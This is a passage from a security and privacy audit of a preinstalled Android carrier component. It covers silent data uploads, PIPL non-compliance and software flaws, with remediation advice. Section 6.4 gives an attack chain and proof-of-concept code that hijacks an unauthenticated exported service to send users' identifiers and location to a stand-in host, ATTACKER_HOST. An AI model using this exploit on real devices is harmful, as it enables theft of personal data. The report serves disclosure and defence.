**(2) The app inventory is a behavioral profile**

(`control.e`):

```java
List<ApplicationInfo> installed = pm.getInstalledApplications(0);               // every installed app
List<UsageStats> list = usageStatsManager.queryAndAggregateUsageStats(t0, t1);  // foreground time per app
NetworkStats ns = networkStatsManager.querySummary(TYPE_MOBILE, imsi, t0, t1);  // per-SIM traffic
```

Per-record serialization (`b.c.a.b.b#a()`):

```java
jSONObject.put("appLabel", ...);                                  // display name
jSONObject.put("pkgName", ...);                                   // package name
jSONObject.put("runTime", this.c + "min");                        // foreground time
jSONObject.put("tx1", ...); jSONObject.put("rx1", ...);           // SIM 1 traffic
jSONObject.put("tx2", ...); jSONObject.put("rx2", ...);           // SIM 2 traffic
jSONObject.put("totalData1", ...); jSONObject.put("totalData2", ...);
jSONObject.put("totalDataWiFi", ...);
```

The inferential power goes well beyond "a list of apps":

| Inferred dimension | Basis | Sensitivity |
|---|---|---|
| Health status | Hospital booking, chronic-disease, fitness, cycle-tracking apps | Health (Art. 28) |
| Religious belief | Religious apps | Religion (Art. 28) |
| Political leaning | News app choice and usage distribution | Specific identity |
| Financial situation | Banking, lending, investment app mix | Financial accounts (Art. 28) |
| Social relations | Social/dating apps and activity hours | Private relations |
| Whether a minor | Education, parental-control, youth-mode apps | Minors (Art. 31) |

**(3) The dual-SIM identity triad is complete**

`IMSI + ICCID + MSISDN` together are the key prerequisite for SIM-cloning fraud. A carrier holding them is defensible for account reconciliation; transmitting them over cleartext HTTP is not (see 6.5).

## 5.4 P-03 — Silent Upload at Boot, Periodic Wakeups 【High】

### 5.4.1 Timeline

```
t=0        device boots
t≈0        BOOT_COMPLETED (priority=2147483647, ahead of nearly every app)
t≈0        three timers armed: self-trigger in 4 minutes, 24h, 7d
t=4min     wake, collect all fields, encrypt, HTTP POST
t=24h      periodic upload (base data)
t=7d       periodic upload (with full app inventory)
also       SIM_STATE_CHANGED (+6min), signal strength changes
```

### 5.4.2 Three Deliberate Choices

**(1) Maximum boot priority**

```xml
<intent-filter android:priority="2147483647">    <!-- Integer.MAX_VALUE -->
    <action android:name="android.intent.action.BOOT_COMPLETED"/>
    <action android:name="android.intent.action.QUICKBOOT_POWERON"/>
</intent-filter>
```

This guarantees execution as early as possible, when the user is least likely to notice unusual network activity.

**(2) A 4-minute delay to avoid the boot-time surge**

```java
j.a("OnBootReceiver", " boot delayed for 4 minutes-->");
b.c.a.b.a.b(f611a, 240000L);
```

A request at the instant of boot is noticeable; four minutes later the system is settled and traffic and battery drain are hard to attribute.

**(3) Penetrating Doze**

```java
alarmManager.setExactAndAllowWhileIdle(2, SystemClock.elapsedRealtime() + j, broadcast);
```

`setExactAndAllowWhileIdle` is **the only alarm type that can force a wake from deep Doze**, and the system rate-limits it heavily (once per 9 minutes per app) precisely because it is reserved for must-be-on-time use. Applying it to periodic data upload mismatches its intent and directly increases standby drain.

### 5.4.3 Perceptibility

| Stage | Perceptible? | Notes |
|---|---|---|
| Collection | No | No UI, no notification, no toast |
| Upload | No | No progress indicator; silent retry on failure |
| Scheduled wakeups | No | Manifests only as a slight rise in standby drain |
| First run | Partly | Runtime permissions for 3 items are requested only if the user opens `TestActivity` manually, with no explanation of purpose |

### 5.4.4 Six Choices Pointing the Same Way

| Choice | Objective effect | Conventional practice |
|---|---|---|
| Boot priority `2147483647` | Runs ahead of nearly everything | Usually unset, or 1000 |
| 4-minute delay | Avoids the boot surge | No reason to do this |
| `setExactAndAllowWhileIdle()` | Penetrates Doze | `WorkManager`, which allows batching and deferral |
| No notification or icon | No visual cue | Background sync usually keeps a notification |
| Silent queueing on failure | No error surfaced | Usually logged and surfaced |
| No settings UI at all | Nowhere to look or disable | Usually a settings screen |

**Objective statement:** each of the six has a plausible technical rationale (performance, battery). But **all six point in the same direction** — reducing the probability of detection. This holds without inferring motive.

## 5.5 P-04 — Recipient, Purpose, Retention, Sharing All Undisclosed 【High】

| Item | Actual situation |
|---|---|
| Recipient identity | **Confirmed as China Unicom** (`pub.cer` subject `O=UNICOM`), but nothing in the app tells the user |
| Purpose | Undisclosed. "Device management" is an inference, not a statement |
| Retention | Undisclosed. 100 + 500 local rows; server unknown |
| Third-party sharing | Undisclosed. The 50+ vendor table hints at flow between carrier and vendors `[C]` |
| Cross-border transfer | Undisclosed `[C]` |
| Processing method | Undisclosed (whether joined, whether used for marketing profiles) `[C]` |
| Rights channel | None (no support entry, no privacy contact) |

## 5.6 P-05 — Users Have No Real Control 【High】

| Means of control | Feasible? | Notes |
|---|---|---|
| Disable collection in-app | No | `f.g` defaults to true; only some models override it from system settings |
| Withdraw consent | No | No entry point |
| Delete uploaded data | No | No channel |
| Clear local data | Indirectly | Only the exported service's `e()` deletes the config file; ordinary users cannot reach it |
| Uninstall | Usually not | Platform signature + preinstalled |
| Disable the app | Depends on ROM | Some ROMs allow "disable", but it may affect VoLTE/network — a disable-or-lose tradeoff |
| Restrict network access | Depends on ROM | Requires a system firewall or third-party tool |

**Structural judgment:** the user has no substantive choice or exit in this relationship. The core of personal information protection is user control over their own data; when that control is zero, **even a reasonable collection scope loses its legitimacy** `[B]`.

### 5.6.1 Implementation of the Ten Statutory Rights

| Right | Article | Implemented | Gap |
|---|---|---|---|
| To be informed | 44 | No | Disclosure never delivered, content incomplete |
| To decide | 44 | No | No consent or refusal entry |
| To access and copy | 45 | No | No query channel |
| To data portability | 45 | No | No export mechanism |
| To rectify and supplement | 46 | No | No channel |
| To delete | 47 | No | Only auto-clears after a successful upload; user cannot initiate |
| To withdraw consent | 15 | No | No entry (some models rely on system settings) |
| To an explanation | 48 | No | No channel |
| To refuse automated decision-making | 24 | No | Profiling never disclosed |
| Rights of close relatives of a deceased person | 49 | No | No channel |

**0 of 10.** The "convenient mechanism for receiving and handling rights requests" required by Article 50 does not exist at all.

## 5.7 P-06 — Sensitive Data Retained in Plaintext 【High】

| Location | Content | Capacity | Protection |
|---|---|---|---|
| `databases/systemhelper` (table `history`) | Full device-info JSON | 100 rows | **None** |
| `databases/signalhelper` (table `signal`) | Signal metrics + **GPS coordinates** | **500 rows** | **None** |
| `shared_prefs/...xml` | Upload address, log switch, ICCID | — | `MODE_WORLD_READABLE` |
| logcat | Full plaintext JSON | — | **None** |

```java
// b.c.a.b.d — history
sQLiteDatabase.execSQL("create table history(id integer primary key autoincrement, jsonString text)");
contentValues.put("jsonString", str);          // plaintext, max 100

// b.c.a.b.m — signal
sQLiteDatabase.execSQL("create table signal(id integer primary key autoincrement, jsonString text)");
if (cursorQuery.getCount() >= 500) { ... }     // plaintext, max 500

// b.c.a.b.l — SharedPreferences
context.getSharedPreferences("com_mobiletools_systemhelper_preference", 4);   // MODE_WORLD_READABLE
```

**Three scenarios that matter to users:**

1. **Resale / repair** — if the device is rooted or debug access is obtained during repair, recycling, or resale, up to 600 records can fully reconstruct the previous owner's dual-SIM identities, habitual cell towers, GPS tracks, and app usage.
2. **Same-UID cross-read** — under `sharedUserId`, any app with the same signature can read these files directly (see 6.7).
3. **Logs read by third parties** — anyone with `READ_LOGS` (older versions) or adb debug access can bulk-export the plaintext PII.

## 5.8 P-07 — Forcibly Modifies the System VoLTE Setting 【Medium】

`b.c.a.a.c#a(Context, int)` performs a write while ostensibly *reading* the VoLTE state:

```java
ImsMmTelManager imsMmTelManager = imsManager.getImsMmTelManager(iC);
if (!imsMmTelManager.isAdvancedCallingSettingEnabled()) {
    j.a("DeviceInfoReaderBase", "before open:false");
    // reflective call into a hidden API, forcing the value to true
    b.c.a.b.o.a(
        b.c.a.b.o.a((Class<?>) ImsMmTelManager.class,
                    "setAdvancedCallingSettingEnabled",  new Class[]{Boolean.TYPE}),
        imsMmTelManager, true);
}
```

**Real-world impact on users:**

- VoLTE connects calls faster, but on some plans **video calls may incur extra charges**;
- Under international roaming, VoLTE billing differs from domestic, so forcing it on can produce unexpected charges;
- On some networks VoLTE actually degrades call quality or causes drops;
- If a user **deliberately turned VoLTE off** for any of these reasons, this app turns it back on — silently.

This is "collecting data" used as cover for "changing settings", and it exceeds the legitimate boundary of data collection.

## 5.9 P-08 — Vulnerable Groups and Specific Scenarios 【Medium】

| Group / scenario | Risk characteristics |
|---|---|
| **Minors** | Carrier-customized handsets bought by parents ship the same component; the app inventory exposes social, gaming, and education app usage; guardians cannot exercise refusal on the child's behalf. Article 31 requires guardian consent and dedicated rules — the app has neither |
| **Elderly users** | Least able to recognize a preinstalled component, least likely to notice unusual traffic or battery drain |
| **Enterprise / classified terminals** | Device model, app inventory (from which internal systems can be inferred), and habitual location flow to the carrier |
| **Dual-SIM cross-border users** | With a foreign SIM in slot 2, IMSI/ICCID and cell changes reveal border crossings (Art. 38) |
| **Second-hand device owners** | Inherit the previous owner's residual data (see 5.7) |

## 5.10 Compliance Determination

| Law / standard | Provision | Verdict | Basis |
|---|---|---|---|
| PIPL | Art. 6 — minimum necessity | ✗ Violated | 42% of fields have no causal link to purpose |
| PIPL | Art. 13 — legal basis | ✗ Violated | None of the six bases holds |
| PIPL | Art. 17 — disclosure | ✗ Violated | 23% coverage, never delivered |
| PIPL | Art. 24 — automated decision-making | ✗ Violated | Profiling undisclosed, no refusal path |
| PIPL | Art. 28/29 — sensitive data | ✗ Violated | 13 sensitive fields, no separate consent |
| PIPL | Art. 51 — security measures | ✗ Violated | Cleartext in transit and at rest |
| PIPL | Art. 55 — impact assessment | Not found | Sensitive processing requires prior PIA |
| GB/T 35273-2020 | 5.2 / 6.3 / 7.1 | ✗ Violated | Rules unpublished, transit unencrypted, no withdrawal |
| App violations determination method (2019) | Items 1 / 3 / 4 / 6 | ✗ All four | Rules unpublished, irrelevant data collected, no consent, no deletion channel |
| MIIT Order No. 24 | Art. 8, 9 | ✗ Violated | Rules unpublished, collection without consent |
| Preinstalled app regulation (2016 No. 407) | Art. 6, 7 | ✗ Violated | Collection without consent + not uninstallable |
| GDPR (if EU users involved) | Art. 5 / 6 / 13 / 32 | ✗ Violated | No legal basis, no disclosure, no safeguards |

### 5.10.1 The Six Legal Bases, Tested One by One

| Basis (PIPL Art. 13) | Holds? | Reason |
|---|---|---|
| ① Consent obtained | No | No valid consent; see 5.2 |
| ② Necessary to conclude or perform a contract | No | A telecom service contract does not require uploading the full app inventory; device registration can use a hash |
| ③ Statutory duty or legal obligation | No | No law requires collecting installed-app lists; real-name registration requires only the phone number |
| ④ Public health emergency or similar | No | Not applicable |
| ⑤ Public-interest journalism or oversight | No | Not applicable |
| ⑥ Processing publicly available information | No | None of this data is public |

**None of the six holds.** This is the most fundamental judgment in the report — the processing activity lacks a legal basis from the outset.

> **Fair note:** in some jurisdictions a preinstalled system component could invoke "legitimate interests" (GDPR Art. 6(1)(f)). But China's PIPL **has no "legitimate interests" basis** — Article 13 is a closed list — so that defense does not hold under Chinese law `[B]`.

## 5.11 Data Aggregation: Individually Ordinary, Collectively a Profile

### 5.11.1 Identity Anchoring

```
IMEI (device-unique) + IMSI (SIM-unique) + MSISDN (real-name phone number) + ICCID (card-unique)
```

Together these form a complete anchor pointing at a specific natural person: a physical device, a real-name SIM, a phone number, and a device identifier. The carrier already holds the subscriber's real-name records, so a join `[C]` turns all 39 fields into **attributed behavioral records**.

### 5.11.2 Location Trajectory

`CellID + LAC` gives hundreds of meters to a few kilometers per reading; `History[]` retains past readings, and with a 24-hour cycle one can determine:

- Home location (nighttime cell clustering)
- Workplace (daytime clustering)
- Anomalous movement (cross-city cell changes)
- Primary/secondary SIM and cross-border behavior

If `f.e` is enabled, there is also a 1-second / 10-meter GPS track.

### 5.11.3 How Aggregation Changes the Nature of the Data

| Combination | Nature |
|---|---|
| `Model` alone | Device statistics, not personal information |
| `+ IMEI` | Device-identifiable, quasi-personal |
| `+ IMSI + MSISDN` | **Identifies a natural person — personal information** |
| `+ CellID/LAC + History` | **Tracks a natural person — sensitive personal information** |
| `+ AppInfo[]` | **Characterizes a natural person — a personal profile** |
| `+ SignalInfo.location` | **Precisely locates a natural person — sensitive** |

The dataset therefore crosses the Article 24 threshold for "automated analysis forming a personal profile", while the app **discloses none of it and offers no refusal path**.

**Key point:** even if the collector never *intended* to build profiles, **once data is centralized the inferential capability objectively exists**, independent of intent. This is precisely why Article 51 requires de-identification.

## 5.12 Counter-Evidence and Uncertainty

The following **weakens but does not overturn** the conclusions above. This is the core of the report's objectivity.

### 5.12.1 Facts Favorable to the Vendor

| # | Fact | Impact |
|---|---|---|
| 1 | The app does contain disclosure text (5 fragments, semantically complete) | Shows disclosure was not entirely ignored; but the text is undisplayed and incomplete |
| 2 | `allowBackup="false"` | Blocks the `adb backup` path — correct configuration |
| 3 | Uploads are encrypted (RSA + AES) | Flawed design, but shows protective intent |
| 4 | Runtime permissions are checked before collection | Follows the Android permission model; no bypass |
| 5 | Uploads only over Wi-Fi or a Unicom network | Objectively narrows the exfiltration surface |
| 6 | `RegisterJobService` correctly declares `BIND_JOB_SERVICE` | At least one correctly configured component |
| 7 | A `"User Permission Closed!"` log branch exists | Suggests a user-off path was once designed |
| 8 | **Some models have genuine consent gating** | vivo/Baidu adapters read system settings and truly skip collection when off (but do not cover most models) |

### 5.12.2 What This Report Cannot Establish

| # | Item | Status |
|---|---|---|
| 1 | Whether the server joins data with subscriber records | `[C]` |
| 2 | Whether data is shared with device vendors or third parties | `[C]` (the 50+ vendor table is **not** evidence of sharing) |
| 3 | Whether it is used for marketing, risk control, or other secondary purposes | `[C]` |
| 4 | Whether it is transferred abroad | `[C]` |
| 5 | Whether a leak has actually occurred | `[D]` |
| 6 | Whether data has ever been sold | `[D]` **No evidence; no such allegation is made** |
| 7 | Whether a privacy impact assessment or regulatory filing was done | `[C]` |
| 8 | Whether the server can remotely enable `f.e` (the GPS switch) | `[C]` |

### 5.12.3 Boundaries

- This report **does not allege** malicious or data-theft intent. From the code, this is a device management component whose collection is part of its stated purpose.
- This report **does not allege** a violation of real-name registration rules — those require the carrier to collect identity data, not the user's app list.
- This report **does not allege** that all preinstalled components behave this way. Conclusions apply to this sample only.

### 5.12.4 An Honest Caveat

"Device management components collect IMEI" is not unusual in this industry; some carrier-customized handsets genuinely use it to build a terminal database. The central allegation here is therefore **not "it collects IMEI"**, but:

> **While collecting far more sensitive data than necessary, it neither discloses effectively, nor obtains consent, nor offers any exit.**

The combination is the problem.

## 5.13 Elements of Tort Liability

Under Article 69 of PIPL (presumption of fault):

| Element | Established | Basis |
|---|---|---|
| ① Processing activity exists | Yes | Collection + storage + transmission, see 4.1/4.5 |
| ② No legal basis | Yes | None of the six bases holds; none of the four consent elements holds |
| ③ Damage or risk of damage | Yes | Sensitive data collected beyond scope and transmitted in cleartext, constituting an infringement of personality rights under Civil Code Art. 1034–1039 |
| ④ Causation | Yes | The risk flows directly from the collection and transmission |
| ⑤ Fault | **Presumed** | Article 69 presumes fault; the controller must prove absence of fault, and this report finds no such proof |

**Conclusion: the four positive elements are established and fault is presumed — this constitutes an infringement of users' personal information rights** `[B]`.

> Note: this report does not assess actual economic loss, which would require proof of specific damage. Article 69 provides that causing damage through infringement of personal information rights triggers liability, and in practice "rights infringed" is itself sufficient.

## 5.14 Severity Rating

| Dimension | Score | Basis |
|---|---|---|
| Data sensitivity | **5** | 13 statutory sensitive fields + inferable profiling |
| Scale | **5** | Preinstalled across an entire model line, 24h/7d cycles, full device lifetime |
| Lack of user control | **5** | Fully uncontrollable |
| Lack of transparency | **5** | 23% coverage, all four consent elements fail |
| **Total** | **20/20** | **Critical** |

### 5.14.1 Comparison with Common Privacy Issues

| Scenario | Sensitivity | Scale | Control | Transparency | Overall |
|---|---|---|---|---|---|
| Crash logs (with model) | 2 | 4 | 4 | 4 | Medium |
| Personalized recommendations (with browsing history) | 3 | 5 | 3 | 4 | Medium-high |
| Ad SDK collecting OAID | 3 | 5 | 2 | 3 | High |
| **This application** | **5** | **5** | **1** | **1** | **Critical** |

---

# Chapter 6 — Security: Flaws in the Software Itself

## 6.1 Core Judgment for This Layer

This layer requires an attacker — but the **barrier is extremely low**. The worst item (S-01) needs no permission, no root, and no user interaction; it needs one ordinary app installed on the device.

## 6.2 Attack Surface

| Entry point | Type | Reachable by | Preconditions |
|---|---|---|---|
| `RegisterHelperService` | Binder | **Any application** | **None** |
| `TestActivity` | Activity | Any application | None |
| `OnBootReceiver` / `SIMStateReceiver` / `ConnectStateReceiver` | Broadcast | Restricted (protected broadcasts) | Some require system permission |
| `/registerv3` transport | Network | On-path attacker | Network position |
| Local databases / prefs | Files | Same UID / root | Signature or root |
| logcat | System log | Local | Debug access / READ_LOGS |

## 6.3 Exported Component Matrix

| Component | Type | exported | permission | Risk |
|---|---|---|---|---|
| `Activity.TestActivity` | Activity | **true** | none | Medium |
| `control.OnBootReceiver` | Receiver | **true** | none | Medium |
| `control.SIMStateReceiver` | Receiver | **true** | none | Medium |
| `control.ConnectStateReceiver` | Receiver | **true** | none | Low |
| `control.ScheduleRegisterReceiver` | Receiver | false | none | Low |
| `control.AppInfoRegisterReceiver` | Receiver | false | none | Low |
| `service.RegisterHelperService` | **Service** | **true** | **none** | **Critical** |
| `service.RegisterIntentService` | Service | false | none | Low |
| `service.RegisterJobService` | Service | false | `BIND_JOB_SERVICE` | Low (correct) |

> The declared `com.mobiletools.systemhelper.permission` (signature level) is **referenced by no component** — a completely ineffective safeguard.

## 6.4 S-01 — Exported Service Without Authentication; Upload Channel Hijackable 【Critical】

**CVSS 3.1 approximate: 9.1** — `AV:L/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N`

### 6.4.1 Evidence

```xml
<service android:name="com.mobiletools.systemhelper.service.RegisterHelperService"
         android:exported="true">
    <intent-filter>
        <action android:name="com.mobiletools.systemhelper.service.IRegisterHelperService"/>
    </intent-filter>
</service>
```

**No `android:permission` is declared.**

The app's own signature-level permission is **never referenced anywhere in the package**:

```xml
<permission android:name="com.mobiletools.systemhelper.permission"
            android:protectionLevel="signature"/>
```

### 6.4.2 Five Exposed Binder Methods

```java
class a extends com.mobiletools.systemhelper.service.a.AbstractBinderC0033a {

    @Override public void a(String str) {          // (1) rewrite upload address
        l.a(RegisterHelperService.this.f626b, str);
    }

    @Override public void a(boolean z) {           // (2) remotely enable plaintext logging
        f.f599a = z;
        l.b(RegisterHelperService.this.f626b, "preference_enable_log", Boolean.valueOf(z));
    }

    @Override public boolean a() {                 // (3) read log switch state
        return l.a(RegisterHelperService.this.f626b, "preference_enable_log", false);
    }

    @Override public void e() {                    // (4) delete the whole prefs file
        l.a();
    }

    @Override public void i(int i) {               // (5) rewrite all three intervals at once
        l.b(RegisterHelperService.this.f626b, i);              // → scheduleInterval (milliseconds)
        l.a(RegisterHelperService.this.f626b, (i * 8) / 5);    // → appInfoInterval
        l.c(RegisterHelperService.this.f626b, (i * 9) / 5);    // → signalInfoInterval
    }
}
```

`onBind()` performs **no caller verification whatsoever**:

```java
@Override
public IBinder onBind(Intent intent) {
    j.b("RegisterHelperService", "registerhelper Service onBind sucessed!");
    return new a();                     // returned directly; Binder.getCallingUid() never checked
}
```

### 6.4.3 Why Changing One String Hijacks the Whole Chain

The upload URL prefix comes from exactly the key that `a(String)` writes:

```java
// b.c.a.b.l
public static String c(Context context) {
    return a(context, "serverAddress", f.w);      // default http://dm.wo.com.cn:18080/registerv3
}

// control.g#a(c) — the upload thread
String str = l.c(this.f625b)                      // ← externally writable
        + "?ver=3.0&model=" + URLEncoder.encode(cVar.f622b, "utf-8")
        + "&manuf=" + URLEncoder.encode(cVar.f621a, "utf-8")
        + "&sign=" + strEncode;
byte[] bArrA2 = b.c.a.b.c.a(strA, bArrA);
new b.c.a.b.g().a(str, bArrA2, bArrA);            // POST to that address
```

Once `serverAddress` is rewritten, **the upload path needs no other change** — the next scheduled task sends data to the new address.

### 6.4.4 Full Attack Chain

```
Malicious app (zero permissions)
  → bindService(com.mobiletools.systemhelper/.service.RegisterHelperService)
  → transact(TRANSACTION_a, "http://ATTACKER_HOST:8080/collect")
  → SharedPreferences.serverAddress = attacker address
  → [wait] boot +4min / 24h timer / SIM change
  → both slots' IMEI, IMSI, ICCID, phone number, cell data, full app inventory
     POSTed to the attacker as application/encrypted-json
```

**Attacker cost:** an Android project of roughly 30 lines, no permission requests, no user interaction — install and wait. For a component with a million installs, that is verified identity, location, and behavioral data for a million users.

### 6.4.5 Proof of Concept (conceptual, never executed)

```java
Intent it = new Intent("com.mobiletools.systemhelper.service.IRegisterHelperService");
it.setPackage("com.mobiletools.systemhelper");
bindService(it, conn, Context.BIND_AUTO_CREATE);

// onServiceConnected(ComponentName n, IBinder b)
Parcel d = Parcel.obtain(), r = Parcel.obtain();
d.writeInterfaceToken("com.mobiletools.systemhelper.service.IRegisterHelperService");
d.writeString("http://ATTACKER_HOST:8080/collect");
b.transact(1 /* verify the transaction id against the AIDL declaration order */, d, r, 0);
d.recycle(); r.recycle();
```

### 6.4.6 Remediation

1. Set `android:exported="false"` — the service is used only within this app and has no reason to be exported.
2. If export is genuinely required, add `android:permission="com.mobiletools.systemhelper.permission"` and verify `Binder.getCallingUid()` signature inside the Binder methods.
3. Validate `serverAddress` before writing: allow only `https://*.wo.com.cn`, and add an HMAC to prevent tampering.
4. Capabilities like `a(String)` and `a(boolean)` should never be exposed over Binder to external callers.

## 6.5 S-02 — Cleartext HTTP End to End 【Critical】

**CVSS 3.1 approximate: 7.0** — `AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:L/A:N`

### 6.5.1 Evidence

```xml
<application ... android:usesCleartextTraffic="true">
```

```java
// b.c.a.b.f
public static String w = "http://dm.wo.com.cn:18080/registerv3";
public static String x = "http://dm.wo.com.cn:18080/public/ip";

// b.c.a.b.g
HttpURLConnection httpURLConnection = (HttpURLConnection) new URL(str).openConnection();
this.f601a.setRequestMethod("POST");
this.f601a.setRequestProperty("Content-Type", "application/encrypted-json");
```

No TLS, no certificate validation, no pinning, no `network_security_config`.

### 6.5.2 Impact

- Anyone on the same Wi-Fi or carrier path can capture the full URL and body.
- The body is encrypted, but the key derives from the plaintext MD5 (S-03) — **effectively equivalent to cleartext**.
- DNS hijacking, transparent proxies, and hostile hotspots can redirect the flow.
- Fails the mandatory "encryption and other security measures" requirement of PIPL Article 51.

### 6.5.3 Remediation

Enforce HTTPS (TLS 1.2+); remove `usesCleartextTraffic`; add a `network_security_config.xml` that forbids cleartext fallback; pin certificates for `*.wo.com.cn`.

## 6.6 S-03 — Cryptographic Misuse; Encryption Is Decorative 【Critical】

**CVSS 3.1 approximate: 6.3** — `AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N`

### 6.6.1 Evidence

```java
// b.c.a.b.c
public static byte[] a(String s) {                          // (1) MD5(plaintext)
    return MessageDigest.getInstance("MD5").digest(s.getBytes("UTF-8"));
}

public static byte[] a(String s, byte[] key) {              // (2) AES(plaintext, key=MD5)
    SecretKeySpec secretKeySpec = new SecretKeySpec(bArr, "AES");
    Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
    cipher.init(1, secretKeySpec);
    return cipher.doFinal(str.getBytes("utf-8"));
}

// b.c.a.b.k
Cipher cipher = Cipher.getInstance("RSA/ECB/PKCS1Padding"); // (3) encrypts only the MD5
```

### 6.6.2 Six Defects

| # | Defect | Consequence |
|---|---|---|
| 1 | **AES key = MD5(plaintext JSON)** | Key derived deterministically from plaintext; no KDF, no salt, no iteration. The JSON structure is highly predictable (fixed field names, small value domains), so offline enumeration is feasible |
| 2 | **Key and signature are the same value** | `sign = RSA(MD5)`, `key = MD5`. Anyone who unwraps `sign` gets the key; one private-key leak compromises the entire fleet |
| 3 | **ECB mode** | No IV; identical plaintext blocks produce identical ciphertext blocks, enabling block splicing and replay analysis |
| 4 | **RSA uses PKCS#1 v1.5** | Not OAEP; exposed to Bleichenbacher-style padding oracle risk |
| 5 | **MD5 used for security** | Collisions known; deprecated |
| 6 | **Session-key mechanism unimplemented** | See below |

### 6.6.3 Defect Six Is the Most Telling

The upload method signature is:

```java
public boolean a(String str, byte[] body, byte[] rsaWrappedSessionKey)
```

Three parameters; the third should semantically be "a random session key wrapped with RSA". Inside the method body:

```java
OutputStream out = this.f601a.getOutputStream();
out.write(bArr);        // only the body is written
// bArr2 (the third parameter) is never referenced
```

**The "random key + key encapsulation" design was reduced to "MD5 derivation", leaving the third parameter dead.** This is not sloppy implementation; it is a security design that was effectively abandoned during development.

### 6.6.4 Verified Empirically

Decrypting the request body with `MD5(plaintext)` reproduces the original byte for byte (see Appendix D):

```bash
$ openssl enc -d -aes-128-ecb -K $(openssl dgst -md5 plain.json | awk '{print $NF}') \
        -nosalt -in body.bin -out decrypted.json
$ diff plain.json decrypted.json
(no output = identical)
```

This does not prove "other people's traffic can be broken", but it does prove one thing: **the key requires no secret whatsoever to derive**. The encryption layer provides obfuscation, not confidentiality.

### 6.6.5 Weak Upload Public Key

```
Subject  : C=CN, ST=BJ, L=BJ, O=UNICOM, OU=UNICOM, CN=UNICOM
Validity : 2019-05-24 → 2119-04-30 (100 years)
Key      : 1024-bit RSA
```

NIST SP 800-57 has discouraged 1024-bit RSA for new systems since 2013; a 100-year rotation gap means a single private-key compromise affects a century. This also explains why signatures are 128 bytes rather than 256.

### 6.6.6 A Fair Note on ECB

All 71 ciphertext blocks in this sample are unique; no block repetition was observed. That is because the sample JSON has distinct values per field. ECB's theoretical weaknesses (no IV, determinism, spliceability) remain, but **should not be overstated as "visible repeated blocks"**.

### 6.6.7 Remediation

Transport over TLS; switch to `AES-256-GCM` with a `SecureRandom` session key wrapped by `RSA-OAEP`; remove MD5 and ECB; move to a 2048-bit or stronger key with a rotation policy.

## 6.7 S-04 — Platform-Level CA Certificate + sharedUserId 【Critical】

### 6.7.1 Evidence

```
Subject      : CN=bbkmobile.com.cn, OU=IQOO, O=BBK, C=CN
BasicConstraints: CA:true (PathLen unlimited)
Validity     : 2012-09-25 → 2040-02-11 (28 years)
Algorithm    : SHA1withRSA / 2048 bit

Manifest     : android:sharedUserId="com.mobiletools.systemhelper.uid"
```

### 6.7.2 Three Risks

| Risk | Description |
|---|---|
| **The signing key is a CA key** | Reusing an app signing key as a CA key is a key-management anti-pattern; the blast radius exceeds one app |
| **The platform key is widely circulated** | The subject details match the publicly circulating vivo/BBK platform signing key, repackaged repeatedly in third-party ROMs and flashing packages |
| **sharedUserId amplifies the impact** | Apps sharing the signature share a UID and can read each other's private directories, including the plaintext databases |

### 6.7.3 Combined Consequence

If the key has leaked, an attacker can sign a "same-signature" APK declaring the same `sharedUserId`, and thereby:

1. Read the plaintext PII in this app's private directory (600 rows);
2. Inherit the runtime permissions already granted (including `READ_PRIVILEGED_PHONE_STATE`);
3. Take over the Binder channel under the same UID.

> Note: the APK contains a v2/v3 signing block (`APK Sig Block 42` present), so it is **not** vulnerable to classic Janus (CVE-2017-13156).

### 6.7.4 Remediation

Rotate the signing key (app-specific, non-CA, SHA-256); reassess whether `sharedUserId` is necessary (discouraged since Android 10, progressively restricted from 13); encrypt private data to reduce the impact of same-UID reads.

## 6.8 S-05 — Sensitive Data Stored in Plaintext 【High】

**CVSS 3.1 approximate: 5.9** — `AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N`

### 6.8.1 Evidence

```java
// b.c.a.b.d — history
sQLiteDatabase.execSQL("create table history(id integer primary key autoincrement, jsonString text)");
contentValues.put("jsonString", str);          // full plaintext PII, max 100 rows

// b.c.a.b.m — signal
sQLiteDatabase.execSQL("create table signal(id integer primary key autoincrement, jsonString text)");
if (cursorQuery.getCount() >= 500) { ... }     // plaintext, max 500 rows

// b.c.a.b.l — SharedPreferences
context.getSharedPreferences("com_mobiletools_systemhelper_preference", 4);   // MODE_WORLD_READABLE
```

### 6.8.2 Issues

| Issue | Description |
|---|---|
| Databases unencrypted | Full plaintext PII; readable from root, debug builds, or forensic images |
| `MODE_WORLD_READABLE` (4) | World-readable flag; throws `SecurityException` on some Android 4.3+ builds, genuinely world-readable on older kernels and custom ROMs |
| No TTL | Cleared only after a successful upload; long failures accumulate to the cap |
| Empty `onUpgrade` | Version upgrades silently drop tables or leave stale data |
| Hard-coded path deletion | `new File("/data/data/com.mobiletools.systemhelper/shared_prefs/...")` — breaks in multi-user and app-cloning environments |

**Correct configuration:** `allowBackup="false"` closes the `adb backup` path.

### 6.8.3 Remediation

SQLCipher or a Keystore-derived key; switch to `MODE_PRIVATE`; add TTL and size caps; use `secure_delete` after a successful upload.

## 6.9 S-06 — Plaintext PII Written to Logcat, Switch Remotely Flippable 【High】

**CVSS 3.1 approximate: 6.6** — `AV:L/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N`

### 6.9.1 Evidence

```java
// control.g — upload thread
j.a("RegisterThread", "register postString：" + strA);        // full plaintext JSON

// b.c.a.a.f1
j.a("DeviceManager", "Clear Text mDeivceInfo:" + cVar.a());   // full plaintext JSON
j.a("DeviceManager", "appInfo:" + jSONArray.toString());      // full app inventory
```

### 6.9.2 Two Aggravating Factors

1. **Off by default, but remotely switchable** — via S-01's `a(boolean)`, any app can flip it on;
2. **No masking** — IMEI, IMSI, and phone numbers are emitted in full.

```java
// b.c.a.b.j
public static void a(String str, String str2) {
    if (!f.f599a || str == null || str2 == null) {
        return;
    }
    ...
    Log.d(str, str2);
}
```

### 6.9.3 Exploitation Scenarios

After-sales repair, USB debugging, forensics, older systems with `READ_LOGS`, or a malicious accessibility service combined with screen capture.

### 6.9.4 Remediation

Strip logging calls in release builds with R8 (not a runtime switch); if logs must remain, mask aggressively (last four digits only); forbid Binder from toggling the switch.

## 6.10 S-07 — Over-Broad Exported Surface 【Medium】

### 6.10.1 TestActivity

```xml
<activity android:name="com.mobiletools.systemhelper.Activity.TestActivity"
          android:exported="true">
    <intent-filter>
        <action android:name="com.mobiletools.systemhelper.activity.testactivity"/>
        <category android:name="android.intent.category.DEFAULT"/>
    </intent-filter>
</activity>
```

